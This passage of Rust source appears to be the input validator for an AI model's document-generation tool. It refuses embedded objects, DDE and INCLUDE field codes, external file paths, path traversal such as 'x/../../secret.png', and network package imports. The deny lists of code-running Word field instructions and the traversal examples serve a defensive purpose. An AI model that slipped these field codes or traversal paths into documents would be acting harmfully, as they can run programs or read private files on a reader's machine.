                State::Text
            }
            (State::Text, '"') => {
                code.push('"');
                State::Code
            }
            (State::Text, _) => State::Text,
            (State::Name, '\'') if chars.peek() == Some(&'\'') => {
                chars.next();
                State::Name
            }
            (State::Name, '\'') => {
                code.push('\'');
                State::Code
            }
            (State::Name | State::Bracket(_), '"') => return Err(QUOTED),
            (State::Name, _) => State::Name,
            // `'` escapes the next character of a table reference.
            (State::Bracket(depth), '\'') => match chars.next() {
                Some('"') => return Err(QUOTED),
                _ => State::Bracket(depth),
            },
            (State::Bracket(depth), '[') => State::Bracket(depth + 1),
            (State::Bracket(1), ']') => {
                code.push(']');
                State::Code
            }
            (State::Bracket(depth), ']') => State::Bracket(depth - 1),
            (State::Bracket(depth), _) => State::Bracket(depth),
        };
    }
    match state {
        State::Code => Ok(code),
        _ => Err(UNPAIRED),
    }
}

/// The names `code` (see [`formula_code`]) calls: each word before a `(`,
/// in upper case and without [`FUNCTION_PREFIXES`].
fn called_functions(code: &str) -> impl Iterator<Item = String> + '_ {
    let name = |c: char| c.is_alphanumeric() || matches!(c, '_' | '.' | '\\' | '?');
    code.match_indices('(').filter_map(move |(at, _)| {
        let before = code[..at].trim_end();
        let start = before
            .char_indices()
            .rev()
            .take_while(|&(_, c)| name(c))
            .last()
            .map(|(start, _)| start)?;
        let mut word = before[start..].to_uppercase();
        while let Some(prefix) = FUNCTION_PREFIXES
            .iter()
            .find(|prefix| word.starts_with(*prefix))
        {
            word = word[prefix.len()..].to_owned();
        }
        Some(word)
    })
}

/// Whether a reference before a `!` names another workbook: a quoted name
/// with a path or a `[book]` in it (sheet names cannot hold `[ ] / \`), an
/// unquoted one with a `[book]` (`[x.xlsx]Sheet1!A1`, `[1]Sheet1!A1`), or
/// either ending like a workbook's file (`Book.xlsx!Name`).
fn refers_to_another_workbook(text: &str) -> bool {
    let chars: Vec<char> = text.chars().collect();
    chars.iter().enumerate().any(|(at, &c)| {
        if c != '!' {
            return false;
        }
        let before = &chars[..at];
        let (name, quoted) = if before.last() == Some(&'\'') {
            // Back to the opening quote; `''` is a quote inside the name.
            let close = before.len() - 1;
            let mut end = close;
            let open = loop {
                match before[..end].iter().rposition(|&c| c == '\'') {
                    Some(quote) if quote > 0 && before[quote - 1] == '\'' => end = quote - 1,
                    Some(quote) => break quote + 1,
                    None => break 0,
                }
            };
            (before[open..close].iter().collect::<String>(), true)
        } else {
            let start = before
                .iter()
                .rposition(|&c| c.is_whitespace() || "(),;{}+-*/^&=<>%\"".contains(c))
                .map_or(0, |at| at + 1);
            (before[start..].iter().collect::<String>(), false)
        };
        let lower = name.trim().to_ascii_lowercase();
        // `'Jan:Dec'!B2` is a 3D reference: a colon is no path.
        let separators: &[char] = if quoted {
            &['[', ']', '/', '\\']
        } else {
            &['[', ']']
        };
        lower.contains(separators)
            || WORKBOOK_EXTENSIONS
                .iter()
                .any(|extension| lower.ends_with(extension))
    })
}

/// Where in `text` HYPERLINK's addresses are: each HYPERLINK's first
/// argument is one quoted string, followed by `,` or `)`, that starts with
/// `https://`, `http://`, `mailto:` or `#` (a place in the workbook).
/// `None` when one is anything else: built with `&` or a function, read
/// from a cell, or HYPERLINK named without a call.
fn hyperlink_addresses(text: &str) -> Option<Vec<std::ops::Range<usize>>> {
    let upper = text.to_ascii_uppercase();
    let word = |c: char| c.is_ascii_alphanumeric() || c == '_';
    let mut addresses = vec![];
    for (at, name) in upper.match_indices("HYPERLINK") {
        let end = at + name.len();
        if text[..at].chars().next_back().is_some_and(word)
            || text[end..].chars().next().is_some_and(word)
        {
            continue;
        }
        let body = text[end..]
            .trim_start()
            .strip_prefix('(')?
            .trim_start()
            .strip_prefix('"')?;
        let open = text.len() - body.len();
        let close = open + string_end(body)?;
        if !text[close + 1..].trim_start().starts_with([',', ')']) {
            return None;
        }
        let address = text[open..close].trim_start().to_ascii_lowercase();
        if !["https://", "http://", "mailto:", "#"]
            .iter()
            .any(|start| address.starts_with(start))
        {
            return None;
        }
        addresses.push(open..close);
    }
    Some(addresses)
}

/// Where the quoted string `body` starts ends: the offset of its closing
/// `"` (`""` is a quote inside it).
fn string_end(body: &str) -> Option<usize> {
    let mut chars = body.char_indices().peekable();
    while let Some((offset, c)) = chars.next() {
        if c == '"' {
            if chars.peek().is_some_and(|&(_, next)| next == '"') {
                chars.next();
            } else {
                return Some(offset);
            }
        }
    }
    None
}

/// Element types a batch may not add: a diagram (officecli renders it in a
/// browser it starts, with mermaid.js from the network), an embedded
/// object or package (an executable inside the document).
const REFUSED_TYPES: &[&str] = &[
    "diagram",
    "flowchart",
    "ole",
    "oleobject",
    "object",
    "embed",
    "package",
];
/// The Word fields a document may hold: they show a number or a date, and
/// run nothing.
const FIELD_NAMES: &[&str] = &["page", "numpages", "date", "time", "toc"];
/// officecli's field types: each is also an element type `add` takes, and
/// then reads its `code` as the raw field instruction. `section` is not one:
/// as an element it is a section break (`type: nextPage`, `orientation`…);
/// as a `fieldType` it is still refused, like any name but [`FIELD_NAMES`].
const FIELD_TYPES: &[&str] = &[
    "field",
    "page",
    "pagenum",
    "pagenumber",
    "numpages",
    "date",
    "author",
    "title",
    "time",
    "filename",
    "sectionpages",
    "mergefield",
    "ref",
    "pageref",
    "noteref",
    "seq",
    "styleref",
    "docproperty",
    "if",
    "createdate",
    "savedate",
    "printdate",
    "edittime",
    "lastsavedby",
    "subject",
    "numwords",
    "numchars",
    "revnum",
    "template",
    "comments",
    "doccomments",
    "keywords",
];
/// The properties officecli reads a field's name or instruction from.
const FIELD_KEYS: &[&str] = &["instruction", "instr", "code", "field", "fieldtype"];
/// Field instructions that run a program, fetch or link a file, or ask the
/// reader for input; `INCLUDE…` too.
const FIELD_WORDS: &[&str] = &[
    "DDE",
    "DDEAUTO",
    "LINK",
    "IMPORT",
    "DATABASE",
    "FILLIN",
    "RD",
    "HYPERLINK",
    "AUTOTEXT",
    "MACROBUTTON",
    "EMBED",
];
/// Field instructions that must not appear in any property (R44).
const FIELD_CODES: &[&str] = &["DDE", "DDEAUTO", "INCLUDEPICTURE", "INCLUDETEXT"];

/// The words of a value as Word reads a field instruction: split at any
/// whitespace, quote or brace.
fn field_words(text: &str) -> impl Iterator<Item = String> + '_ {
    text.split(|c: char| c.is_whitespace() || "\"'\u{201C}\u{201D}\u{2018}\u{2019}{}".contains(c))
        .filter(|word| !word.is_empty())
        .map(str::to_uppercase)
}

/// Whether a field's name or instruction only shows a page number or a
/// date: its first word is one of [`FIELD_NAMES`], and no word runs,
/// fetches or links anything.
fn shows_only_a_number(text: &str) -> bool {
    let mut words = field_words(text).peekable();
    words
        .peek()
        .is_some_and(|first| FIELD_NAMES.contains(&first.to_lowercase().as_str()))
        && words.all(|word| !FIELD_WORDS.contains(&word.as_str()) && !word.starts_with("INCLUDE"))
}

/// A property key as officecli names one: words of ASCII letters, digits
/// and `_`, each starting with a letter, joined by `.` (`font.color`).
fn is_property_key(key: &str) -> bool {
    key.split('.').all(|part| {
        part.starts_with(|c: char| c.is_ascii_alphabetic())
            && part.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
    })
}

/// An item's `type`, as officecli compares it.
fn element_type(fields: &Map<String, Value>) -> String {
    fields
        .get("type")
        .and_then(Value::as_str)
        .unwrap_or_default()
        .trim()
        .to_ascii_lowercase()
}

/// Why an item's shape is refused, if it is: a `type` that is not a word,
/// or one a batch may not add; `props` that are not one object of scalars
/// with distinct ASCII keys (officecli also takes `["key=value"]` arrays and
/// keeps the last of two keys that differ in case); a field other than
/// [`FIELD_NAMES`]; a field instruction of [`FIELD_CODES`] anywhere.
fn refused_shape(fields: &Map<String, Value>) -> Option<String> {
    if let Some(kind) = fields.get("type") {
        let Some(kind) = kind.as_str().filter(|kind| {
            !kind.is_empty()
                && kind
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || "-_".contains(c))
        }) else {
            return Some("\"type\" must be an element type such as slide or paragraph".into());
        };
        if REFUSED_TYPES.contains(&kind.to_ascii_lowercase().as_str()) {
            return Some(format!("\"{kind}\" elements cannot be added here"));
        }
    }
    let empty = Map::new();
    let props = match fields.get("props") {
        None => &empty,
        Some(Value::Object(props)) => props,
        Some(_) => return Some("\"props\" must be an object of property names and values".into()),
    };
    let mut seen = std::collections::HashSet::new();
    for (key, value) in props {
        if !is_property_key(key) {
            return Some(format!("\"props.{key}\" is not a property name"));
        }
        if !seen.insert(key.to_ascii_lowercase()) {
            return Some(format!("\"props.{key}\" is given twice"));
        }
        if value.is_object() || value.is_array() {
            return Some(format!("\"props.{key}\" must be a single value"));
        }
        let text = value.as_str().unwrap_or_default();
        let coded = field_words(text).any(|word| {
            FIELD_CODES.contains(&word.as_str())
                || word.starts_with("INCLUDEPICTURE")
                || word.starts_with("INCLUDETEXT")
        });
        if coded {
            return Some(format!(
                "\"props.{key}\" holds a field instruction that runs or fetches something"
            ));
        }
    }
    // A field's name or instruction, wherever officecli reads one: on any
    // item, and in `type` of an element that is a field.
    let kind = element_type(fields);
    let field = FIELD_TYPES.contains(&kind.as_str());
    let refused = "a field can only be page, numpages, date, time or toc, with nothing that runs, fetches or links";
    if field && kind != "field" && !FIELD_NAMES.contains(&kind.as_str()) {
        return Some(refused.into());
    }
    let mut named = false;
    for (key, value) in props {
        let key = key.to_ascii_lowercase();
        if FIELD_KEYS.contains(&key.as_str()) || (field && key == "type") {
            named = true;
            if !value.as_str().is_some_and(shows_only_a_number) {
                return Some(refused.into());
            }
        }
    }
    if kind == "field" && !named {
        return Some(refused.into());
    }
    None
}

/// The first value under `value` (named `key`, of class `class`) that its
/// property may not hold in a document of `format`, and why. An object's
/// values take their own keys' classes; an array's values take the array's.
fn refused_property(
    key: String,
    value: &Value,
    class: Property,
    format: DocumentFormat,
) -> Option<(String, &'static str)> {
    match value {
        Value::String(text) => refused_value(text, class).map(|why| (key, why)),
        Value::Object(map) => map.iter().find_map(|(name, value)| {
            refused_property(
                format!("{key}.{name}"),
                value,
                property(name, format),
                format,
            )
        }),
        Value::Array(items) => items
            .iter()
            .enumerate()
            .find_map(|(at, value)| refused_property(format!("{key}[{at}]"), value, class, format)),
        _ => None,
    }
}

/// Why a property of `class` may not hold `text`, if it may not.
fn refused_value(text: &str, class: Property) -> Option<&'static str> {
    let text = text.trim();
    let lower = text.to_ascii_lowercase();
    let elsewhere = "names a file or an address; only data: URIs can be used";
    let inline = "must be the table's rows inline (CSV); files and addresses cannot be used";
    match class {
        Property::File => (!is_data_uri(text)).then_some(
            "must be a data: URI (data:<type>;base64,…); files and addresses cannot be used",
        ),
        Property::Link => (!["https://", "http://", "mailto:"]
            .iter()
            .any(|scheme| lower.starts_with(scheme))
            && !links_a_slide(text))
        .then_some("must be an https:, http: or mailto: address, or slide[n]"),
        Property::Data => data_reaches_out(text).then_some(inline),
        Property::Cells => cells_reach_out(text).then_some(inline),
        Property::Prose => None,
        Property::Fill if lower.starts_with("image:") => {
            (!is_data_uri(&text[6..])).then_some("may name an image only as a data: URI")
        }
        Property::Fill if lower.starts_with("linear:") || lower.starts_with("radial:") => {
            let colours = &text[7..];
            (colours.is_empty()
                || !colours
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || "#,;-. ".contains(c)))
            .then_some("a gradient takes colours only")
        }
        // `hh:mm`, `[h]:mm:ss`: a colon after date and time codes is no
        // scheme; every other check holds.
        // …unless what follows the colon starts like a path (`ssh://x`).
        Property::NumberFormat => location(text, |token, rest| {
            is_scheme(token)
                && (rest.starts_with('/')
                    || !token
                        .chars()
                        .all(|c| "hmsdy".contains(c.to_ascii_lowercase())))
        })
        .then_some(elsewhere),
        Property::Fill | Property::Other => names_a_location(text).then_some(elsewhere),
    }
}

/// A scheme's name: a letter, then letters, digits, `+`, `.` or `-`.
fn is_scheme(name: &str) -> bool {
    name.starts_with(|c: char| c.is_ascii_alphabetic())
        && name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "+.-".contains(c))
}

/// A value that names a place outside the document: once `\` reads as `/`,
/// it starts with `/` or `~`, or with `.` unless it is a number (`.5in`),
/// has a `..` segment, or starts with a drive or a scheme other than
/// `data:`. A cell range (`E2:L18`) is none.
fn names_a_location(text: &str) -> bool {
    location(text, |name, _| is_scheme(name))
}

/// [`names_a_location`], with `scheme` deciding which token before a colon
/// is a scheme's (or a drive's) name.
fn location(text: &str, scheme: impl Fn(&str, &str) -> bool) -> bool {
    let path = text.trim().replace('\\', "/");
    let lower = path.to_ascii_lowercase();
    let unsigned = path.strip_prefix('-').unwrap_or(&path);
    let number = unsigned
        .strip_prefix('.')
        .unwrap_or(unsigned)
        .starts_with(|c: char| c.is_ascii_digit());
    let scheme = lower
        .split_once(':')
        .is_some_and(|(name, rest)| scheme(name, rest));
    path.starts_with(['/', '~'])
        || (path.starts_with('.') && !number)
        || path.split('/').any(|part| part.trim() == "..")
        || (scheme && !is_data_uri(&path) && !is_cell_range(&path))
}

/// What a `data` value (or, in a workbook or document, one of its cells)
/// starts with when officecli could read it as a file: a root, a folder
/// (`./`, `../`, `~/`, either slash) or a mention (`@file`). A drive is
/// checked apart (see [`names_a_drive`]).
const PATH_STARTS: &[&str] = &["/", "\\", "./", ".\\", "../", "..\\", "~/", "~\\", "@"];

/// Whether a cell starts with a drive: one ASCII letter and a colon
/// (`C:\x`, or `C:x`, relative to the drive's current folder), unless only
/// numbers follow, as in a one-letter chart series (`A:1`, `B:3.5`).
fn names_a_drive(cell: &str) -> bool {
    match cell.as_bytes() {
        [letter, b':', rest @ ..] if letter.is_ascii_alphabetic() => !rest
            .iter()
            .all(|byte| byte.is_ascii_digit() || b".+-, ".contains(byte)),
        _ => false,
    }
}

/// Whether `text` starts like a path: [`PATH_STARTS`] or a drive.
fn path_like(text: &str) -> bool {
    names_a_drive(text) || PATH_STARTS.iter().any(|start| text.starts_with(start))
}

/// Whether `text` is an address: `scheme://…` or `file:…`.
fn names_an_address(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower
        .split_once("://")
        .is_some_and(|(name, _)| is_scheme(name))
        || lower.starts_with("file:")
}

/// Whether a deck's table or chart `data` (or chart `categories`) would be
/// read as a file or an address rather than as inline cells. officecli
/// 1.0.160 reads it as a file only when the whole value names one, so the
/// whole value (trimmed) is checked: it starts with one of [`PATH_STARTS`],
/// a drive's root (`C:\`) or a drive (see [`starts_with_a_drive`]); a `..`
/// segment climbs out of the folder (`a,b/../../x` too: .NET folds `a,b/..`
/// away); or it is an address. A relative name without those (`s.csv`,
/// `dir/s.csv`, `2025/26`) names nothing outside the engine's own work
/// folder. The other cells of a value of several are text, whatever they
/// start with: `/`, `@x`, `A:优秀`, `.NET`, `~approx`.
fn data_reaches_out(text: &str) -> bool {
    let value = text.trim();
    let path = value.replace('\\', "/");
    let drive_root =
        matches!(path.as_bytes(), [letter, b':', b'/', ..] if letter.is_ascii_alphabetic());
    PATH_STARTS.iter().any(|start| value.starts_with(start))
        || drive_root
        || starts_with_a_drive(value)
        || path.split('/').any(|part| part.trim() == "..")
        || names_an_address(value)
}

/// Whether a whole `data` value starts with a drive: one ASCII letter and a
/// colon, unless what follows up to the first `;` (or the end) is a list of
/// numbers, as in a chart's one-letter series (`A:1,2;B:3,4`, `B:`). A
/// Windows path may hold `,` and `;`, so `C:a,b.csv` and `C:x;y` are a
/// drive's.
fn starts_with_a_drive(value: &str) -> bool {
    match value.as_bytes() {
        [letter, b':', rest @ ..] if letter.is_ascii_alphabetic() => {
            let first = rest.split(|byte| *byte == b';').next().unwrap_or_default();
            !first
                .iter()
                .all(|byte| byte.is_ascii_digit() || b".+-, ".contains(byte))
        }
        _ => false,
    }
}

/// Whether a workbook's or document's table `data` would be read as a file
/// or an address, by the stricter rule these formats keep: one of its cells
/// (split at `,`, `;`, tabs and line breaks; the first starts the value)
/// starts like a path ([`path_like`]); a `..` segment climbs out of the
/// folder; or it is an address. Anything else is prose: `.NET`, `~approx`,
/// `Sales:5`, `v1.2`, `A:1,2`.
fn cells_reach_out(text: &str) -> bool {
    // `a,b/../../x` climbs out of the folder too: .NET folds `b/..` away.
    let climbs = text
        .replace('\\', "/")
        .split(['/', ',', ';', '\n', '\r', '\t'])
        .any(|part| part.trim() == "..");
    climbs
        || text
            .split([',', ';', '\n', '\r', '\t'])
            .any(|cell| path_like(cell.trim()))
        || names_an_address(text)
}

/// One cell: one to three letters and a row number (`B12`).
fn is_cell(text: &str) -> bool {
    let letters = text.chars().take_while(char::is_ascii_alphabetic).count();
    let digits = &text[letters..];
    (1..=3).contains(&letters)
        && (1..=7).contains(&digits.len())
        && digits.chars().all(|c| c.is_ascii_digit())
}

/// `A1:C3`: two cells.
fn is_cell_range(text: &str) -> bool {
    text.split_once(':')
        .is_some_and(|(start, end)| is_cell(start) && is_cell(end))
}

/// An in-deck link target: `slide[n]` or `/slide[n]`, optionally followed
/// by `/shape[…]`.
fn links_a_slide(text: &str) -> bool {
    let text = text.strip_prefix('/').unwrap_or(text);
    let (slide, shape) = match text.split_once('/') {
        Some((slide, shape)) => (slide, Some(shape)),
        None => (text, None),
    };
    let inner = |segment: &'_ str, name: &str| -> Option<String> {
        segment
            .strip_prefix(name)
            .and_then(|rest| rest.strip_prefix('['))
            .and_then(|rest| rest.strip_suffix(']'))
            .filter(|inner| !inner.contains(['[', ']']))
            .map(str::to_owned)
    };
    inner(slide, "slide").is_some_and(|n| !n.is_empty() && n.chars().all(|c| c.is_ascii_digit()))
        && shape.is_none_or(|shape| inner(shape, "shape").is_some_and(|p| predicate(&p)))
}

/// Whether a sheet the batch makes may start an element path: not a file
/// system's first folder, and nothing that separates a path.
fn may_root(name: &str) -> bool {
    !name.contains(['/', '\\', ':']) && !FOLDER_NAMES.contains(&name.trim().to_lowercase().as_str())
}

/// `data:<type>/<subtype>[;…];base64,…`.
fn is_data_uri(text: &str) -> bool {
    let lower = text.trim().to_ascii_lowercase();
    let Some((head, payload)) = lower
        .strip_prefix("data:")
        .and_then(|rest| rest.split_once(','))
    else {
        return false;
    };
    // Base64 only: `data:…;base64,x/../../secret.png` is a path.
    let base64 = payload
        .trim_end_matches('=')
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/');
    if !base64 {
        return false;
    }
    let mut parts = head.split(';');
    let media = parts.next().unwrap_or_default();
    let valid = |part: &str| {
        !part.is_empty()
            && part
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || "+.-_".contains(c))
    };
    media
        .split_once('/')
        .is_some_and(|(kind, sub)| valid(kind) && valid(sub))
        && head.ends_with(";base64")
}

/// An element as officecli names it: `/`, or a known root and segments
/// (`/slide[1]/shape[2]`, `/body/p[last()]`, `/销售/A1:C3` for a sheet in
/// `sheets`); a selector without `/` (`shape`, `p[@paraId=1A2B3C4D]`,
/// `Sheet1!A1`); or for `after`/`before` a `find:<text>` anchor.
fn names_an_element(text: &str, anchor: bool, sheets: &[String]) -> bool {
    if anchor && text.starts_with("find:") {
        return true;
    }
    match text.strip_prefix('/') {
        Some("") => true,
        Some(rest) => element_segments(rest, sheets),
        None => {
            !text.trim().is_empty()
                && !text.contains(['/', '\\'])
                && !text.starts_with(['.', '~'])
                && !text.contains("..")
                && !names_a_location(text)
                && predicates(text).is_some_and(|found| found.into_iter().all(predicate))
        }
    }
}

/// The contents of `text`'s `[…]` predicates; `None` when one is not closed
/// or holds another.
fn predicates(text: &str) -> Option<Vec<&str>> {
    let mut found = vec![];
    let mut rest = text;
    while let Some(open) = rest.find('[') {
        let close = rest[open..].find(']')? + open;
        let inner = &rest[open + 1..close];
        if inner.contains('[') {
            return None;
        }
        found.push(inner);
        rest = &rest[close + 1..];
    }
    (!rest.contains(']')).then_some(found)
}

/// A predicate officecli takes (`1`, `last()`, `@name=Plan`, `@paraId=…`):
/// letters, digits, `_@=()-.` and spaces, and quoted strings without `/`,
/// `\` or `:`.
fn predicate(inner: &str) -> bool {
    let mut quote = None;
    inner.chars().all(|c| match quote {
        Some(open) if c == open => {
            quote = None;
            true
        }
        Some(_) => !matches!(c, '/' | '\\' | ':') && !c.is_control(),
        None if c == '"' || c == '\'' => {
            quote = Some(c);
            true
        }
        None => c.is_ascii_alphanumeric() || "_@=()-. ".contains(c),
    }) && quote.is_none()
}

/// `slide[1]/shape[@name=Title]`: a known root, or a sheet of `sheets`
/// followed by nothing or by a cell, a range, a row, a column, a table or a
/// chart; then names of letters, digits, `_`, `-` and spaces (a cell range
/// joins two with `:`), each with any predicates. A predicate holds no `/`.
fn element_segments(path: &str, sheets: &[String]) -> bool {
    let word = |word: &str| {
        word.starts_with(|c: char| c.is_alphanumeric() || c == '_')
            && word
                .chars()
                .all(|c| c.is_alphanumeric() || matches!(c, '_' | '-' | ' '))
    };
    let segments: Vec<(&str, &str)> = path
        .split('/')
        .map(|segment| segment.split_at(segment.find('[').unwrap_or(segment.len())))
        .collect();
    let valid = segments.iter().all(|(name, rest)| {
        let named = match name.split_once(':') {
            Some((start, end)) => word(start) && word(end),
            None => word(name),
        };
        named && bracketed(rest).is_some_and(|found| found.into_iter().all(predicate))
    });
    let root = segments[0].0.to_lowercase();
    let sheet_part = |(name, rest): &(&str, &str)| {
        let part = name.to_lowercase();
        (rest.is_empty() && (is_cell(name) || is_cell_range(name)))
            || (!rest.is_empty() && matches!(part.as_str(), "row" | "col" | "tbl" | "chart"))
    };
    let rooted = ROOTS.contains(&root.as_str())
        || (sheets.contains(&root) && segments.get(1).is_none_or(sheet_part));
    valid && rooted
}

/// `[a][b]` as `a` and `b`; `None` unless `text` is only such groups.
fn bracketed(text: &str) -> Option<Vec<&str>> {
    let mut found = vec![];
    let mut rest = text;
    while !rest.is_empty() {
        let inner = rest.strip_prefix('[')?;
        let close = inner.find(']')?;
        if inner[..close].contains('[') {
            return None;
        }
        found.push(&inner[..close]);
        rest = &inner[close + 1..];
    }
    Some(found)
}

/// Whether a Typst body imports or includes a package, which would be
/// fetched from the network.
fn imports_a_package(body: &str) -> bool {
    body.contains("@preview/")
        || body.contains("@local/")
        || ["import", "include"].iter().any(|keyword| {
            body.match_indices(keyword)
                .any(|(at, _)| body[at + keyword.len()..].trim_start().starts_with("\"@"))
        })
}

/// `raw` as a file name of `format`: its last path segment, without control
/// or reserved characters and leading dots, with the format's extension in
/// place of any it had; at most [`MAX_NAME_CHARS`] characters.
fn file_name(raw: &str, format: DocumentFormat) -> String {
    let last = raw.rsplit(['/', '\\']).next().unwrap_or_default();
    let printable: String = last
        .chars()
        .filter(|c| {
            !c.is_control()
                && !matches!(c, '<' | '>' | ':' | '"' | '|' | '?' | '*')
                && !matches!(c, '\u{200B}'..='\u{200F}' | '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}' | '\u{FEFF}')
        })
        .collect();
    let trimmed = printable
        .trim_start_matches(|c: char| c == '.' || c.is_whitespace())
        .trim_end();
    let stem = match trimmed.rsplit_once('.') {
        Some((stem, extension))
            if !stem.trim().is_empty()
                && (1..=5).contains(&extension.len())
                && extension.chars().all(|c| c.is_ascii_alphanumeric()) =>
        {
            stem
        }
        _ => trimmed,
    };
    let extension = format.extension();
    let stem: String = stem
        .chars()
        .take(MAX_NAME_CHARS - extension.len() - 1)
        .collect();
    let stem = stem.trim_end_matches(|c: char| c == '.' || c.is_whitespace());
    let stem = if stem.is_empty() { "document" } else { stem };
    format!("{stem}.{extension}")
}

/// How many pages a PDF has: its page dictionaries (`/Type /Page`, not the
/// `/Pages` tree or a `/PageLabel`). Typst writes them uncompressed.
fn pdf_pages(bytes: &[u8]) -> Option<u64> {
    const TYPE: &[u8] = b"/Type";
    let delimiter = |b: u8| b.is_ascii_whitespace() || b"/<>[](){}%".contains(&b);
    let mut count = 0;
    let mut at = 0;
    while let Some(found) = bytes[at..].windows(TYPE.len()).position(|w| w == TYPE) {
        at += found + TYPE.len();
        let rest = &bytes[at..];
        let start = rest
            .iter()
            .position(|b| !b.is_ascii_whitespace())
            .unwrap_or(rest.len());
        let name = &rest[start..];
        if name.starts_with(b"/Page") && name.get(5).is_none_or(|b| delimiter(*b)) {
            count += 1;
        }
    }
    (count > 0).then_some(count)
}

/// One problem a document's checks found.
#[derive(Clone, Debug, PartialEq, Eq, Serialize)]
struct Issue {
    severity: &'static str,
    message: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    path: Option<String>,
}

impl Issue {
    fn warning(message: String, path: Option<String>) -> Self {
        Self {
            severity: "warning",
            message,
            path,
        }
    }
}

/// officecli's severities: 0 error, 1 warning, 2 info, or their names.
fn severity(value: &Value) -> &'static str {
    match value {
        Value::Number(n) => match n.as_u64() {
            Some(0) => "error",
            Some(1) => "warning",
            _ => "info",
        },
        Value::String(name) => match name.to_ascii_lowercase().as_str() {
            "error" | "critical" | "fatal" => "error",
            "info" | "information" | "hint" | "notice" => "info",
            _ => "warning",
        },
        _ => "warning",
    }
}

/// The issues a result and its card keep: identical ones once, with how
/// often they occur; errors first; at most [`MAX_ISSUES`], each bounded.
fn finished(found: Vec<Issue>) -> Vec<Issue> {
    let mut groups: Vec<(Issue, usize)> = vec![];
    for issue in found {
        match groups
            .iter_mut()
            .find(|(first, _)| first.severity == issue.severity && first.message == issue.message)
        {
            Some((_, count)) => *count += 1,
            None => groups.push((issue, 1)),
        }
    }
    let mut issues: Vec<Issue> = groups
        .into_iter()
        .map(|(mut issue, count)| {
            if count > 1 {
                issue.message = format!("{} ({count} places)", issue.message);
                issue.path = None;
            }
            issue
        })
        .collect();
    let rank = |severity: &str| match severity {
        "error" => 0,
        "warning" => 1,
        _ => 2,
    };
    issues.sort_by_key(|issue| rank(issue.severity));
    issues.truncate(MAX_ISSUES);
    for issue in &mut issues {
        issue.message = clip(&issue.message, MAX_ISSUE_CHARS);
        issue.path = issue.path.as_deref().map(|path| clip(path, MAX_PATH_CHARS));
    }
    issues
}

/// At most `max` characters of `text`.
fn clip(text: &str, max: usize) -> String {
    if text.chars().count() <= max {
        return text.to_owned();
    }
    let mut clipped: String = text.chars().take(max.saturating_sub(1)).collect();
    clipped.push('…');
    clipped
}

/// `text` without officecli's "Run 'officecli help …'" advice: the model
/// cannot run it.
fn without_help(text: &str) -> String {
    let mut text = text.to_owned();
    while let Some(start) = ["Run '", "Run `"]
        .iter()
        .filter_map(|hint| text.find(hint))
        .min()
    {
        let end = text[start..]
            .find(". ")
            .map_or(text.len(), |at| start + at + 2);
        text.replace_range(start..end, "");
    }
    text.trim().to_owned()
}

/// A refusal the model can act on: `<code>: <what to change>`.
fn refuse(code: &str, why: impl AsRef<str>) -> String {
    format!("{code}: {}", why.as_ref())
}

/// The engine a format needs, `None` for text; refused when it is missing.
fn engine_for(format: DocumentFormat, engines: &Engines) -> Result<Option<PathBuf>, String> {
    let engine = match format.engine() {
        Engine::Office => &engines.officecli,
        Engine::Typst => &engines.typst,
        Engine::Text => return Ok(None),
    };
    engine.clone().map(Some).ok_or_else(|| {
        refuse(
            DISABLED,
            format!(
                "{} files cannot be made on this computer",
                format.extension()
            ),
        )
    })
}

/// A new private folder `outputs/<doc_id>` for one document, its engines'
/// home, and the content where the engine reads it (or, for text, the file
/// itself). Blocking file IO.
fn prepare(
    store: &AssistantStore,
    sid: &str,
    doc_id: &str,
    document: &Document,
    language: &str,
) -> Result<(PathBuf, PathBuf), String> {
    let dir = store.outputs_dir(sid, doc_id)?;
    let home = dir.join(HOME);
    crate::config::create_private_dir_all(&home).map_err(|_| unwritable())?;
    match (&document.content, document.format.engine()) {
        (Content::Commands(commands), _) => write_new(
            &dir.join(BATCH),
            &serde_json::to_vec(commands).map_err(|_| PROTOCOL)?,
        )?,
        (Content::Text(body), Engine::Typst) => {
            let prelude = PRELUDE.replace("{{LANG}}", language);
            write_new(&dir.join(MAIN), format!("{prelude}{body}").as_bytes())?;
            seal_packages(&home)?;
        }
        (Content::Text(text), _) => write_new(&dir.join(document.format.file()), text.as_bytes())?,
    }
    Ok((dir, home))
}

fn unwritable() -> String {
    refuse(FAILED, "the document's folder could not be written")
}

/// Write a file that must not exist yet, private on Unix.
fn write_new(path: &Path, bytes: &[u8]) -> Result<(), String> {
    use std::io::Write;
    let mut options = std::fs::OpenOptions::new();
    options.write(true).create_new(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        options.mode(0o600);
    }
    options
        .open(path)
        .and_then(|mut file| file.write_all(bytes))
        .map_err(|_| unwritable())
}

/// Typst looks for packages, and caches downloads, only in `home`'s package
/// folder (see the runner), which is read-only: a downloaded package is not
/// kept. The download itself is stopped by the runner's dead proxy and, on
/// macOS, by [`TYPST_SANDBOX`]; a body that names a package is refused
/// before Typst starts.
fn seal_packages(home: &Path) -> Result<(), String> {
    let packages = home.join(TYPST_PACKAGES);
    crate::config::create_private_dir_all(&packages).map_err(|_| unwritable())?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&packages, std::fs::Permissions::from_mode(0o500))
            .map_err(|_| unwritable())?;
    }
    Ok(())
}

/// What an engine made.
struct Made {
    file: PathBuf,
    /// The first page's picture, for the runtime's thumbnail.
    preview: Option<PathBuf>,
    /// A deck's slides as SVG (see [`svg_pages`]), kept beside its
    /// attachment.
    pages: Vec<PathBuf>,
    /// Slides, sheets or pages, when the engine reports them.
    count: Option<u64>,
    issues: Vec<Issue>,
    /// The layout fixes the host applied after the checks (see
    /// [`fix_layout`]).
    fixed: usize,
}

/// One engine at work in one document's folder.
struct Work<'a> {
    exe: &'a Path,
    dir: &'a Path,
    home: &'a Path,
    /// How the model knows the engine.
    name: &'static str,
    /// `sandbox-exec`, to run the engine under `profile`.
    sandbox: Option<&'a Path>,
    /// [`OFFICE_SANDBOX`], [`TYPST_SANDBOX`] or [`PYTHON_SANDBOX`].
    profile: &'static str,
    /// Where officecli keeps its own temporary files (see
